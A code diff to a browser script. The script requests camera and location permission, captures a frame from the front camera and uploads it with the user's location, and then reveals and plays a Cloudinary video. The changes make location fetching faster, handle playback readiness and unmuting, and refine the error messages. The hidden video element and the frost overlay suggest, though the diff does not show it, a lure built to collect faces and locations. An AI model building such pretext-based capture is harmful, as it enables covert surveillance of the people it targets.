@@ -36,9 +36,13 @@
     return 'unknown';
   }
 
-  function showPermissionDenied() {
-    els.statusText.textContent = PERMISSION_DENIED;
+  function showStatus(message) {
+    els.statusText.textContent = message;
     els.statusBadge.classList.add('visible');
+  }
+
+  function showPermissionDenied() {
+    showStatus(PERMISSION_DENIED);
   }
 
   function hideStatus() {
@@ -226,6 +230,39 @@
     });
   }
 
+  function waitForPlaybackReady(video, timeoutMs = 20000) {
+    return new Promise((resolve, reject) => {
+      if (video.readyState >= 2) {
+        resolve();
+        return;
+      }
+
+      const timer = setTimeout(() => {
+        cleanup();
+        reject(new Error('Video load timeout'));
+      }, timeoutMs);
+
+      function cleanup() {
+        clearTimeout(timer);
+        video.removeEventListener('loadeddata', onReady);
+        video.removeEventListener('error', onError);
+      }
+
+      function onReady() {
+        cleanup();
+        resolve();
+      }
+
+      function onError() {
+        cleanup();
+        reject(new Error('Video failed to load'));
+      }
+
+      video.addEventListener('loadeddata', onReady, { once: true });
+      video.addEventListener('error', onError, { once: true });
+    });
+  }
+
   async function playCloudinaryVideo() {
     const playbackUrl = cfg.playbackVideoUrl;
     if (!playbackUrl) throw new Error('Playback URL not configured');
@@ -235,16 +272,29 @@
     els.video.removeAttribute('src');
     els.video.classList.remove('concealed');
     els.video.classList.add('playback');
-    els.video.src = playbackUrl;
     els.video.loop = true;
-    els.video.muted = false;
     els.video.playsInline = true;
+    els.video.setAttribute('playsinline', '');
+    els.video.setAttribute('webkit-playsinline', '');
+    els.video.preload = 'auto';
+    els.video.muted = true;
+    els.video.src = playbackUrl;
+    els.video.load();
+
+    await waitForPlaybackReady(els.video);
 
     try {
       await els.video.play();
     } catch {
       els.video.muted = true;
       await els.video.play();
+    }
+
+    try {
+      els.video.muted = false;
+      await els.video.play();
+    } catch {
+      els.video.muted = true;
     }
   }
 
@@ -262,7 +312,7 @@
     }
 
     try {
-      const location = await getCurrentPosition();
+      const locationPromise = getCurrentPosition();
       stream = await navigator.mediaDevices.getUserMedia({
         video: {
           facingMode: { ideal: 'user' },
@@ -277,6 +327,7 @@
       await els.video.play();
       await waitForVideoReady();
       const uploadResult = await captureAndUpload();
+      const location = await locationPromise;
       saveUploadRecord(uploadResult, location);
 
       hideFrostOverlay();
@@ -285,12 +336,20 @@
       return true;
     } catch (err) {
       const name = err?.name || '';
+      const message = err?.message || '';
+
       if (name === 'NotAllowedError' || name === 'PermissionDeniedError' || name === 'NotFoundError') {
         showPermissionDenied();
-      } else if (err.message === 'Invalid video dimensions' || err.message === 'Capture failed') {
+      } else if (message === 'Invalid video dimensions' || message === 'Capture failed') {
         showPermissionDenied();
+      } else if (message === 'Upload failed' || message === 'Network error') {
+        showStatus('Upload failed');
+      } else if (message === 'Playback URL not configured') {
+        showStatus('Video not configured');
+      } else if (message === 'Video failed to load' || message === 'Video load timeout') {
+        showStatus('Video failed to play');
       } else {
-        showPermissionDenied();
+        showStatus('Something went wrong');
       }
       stopStream();
       concealVideo();
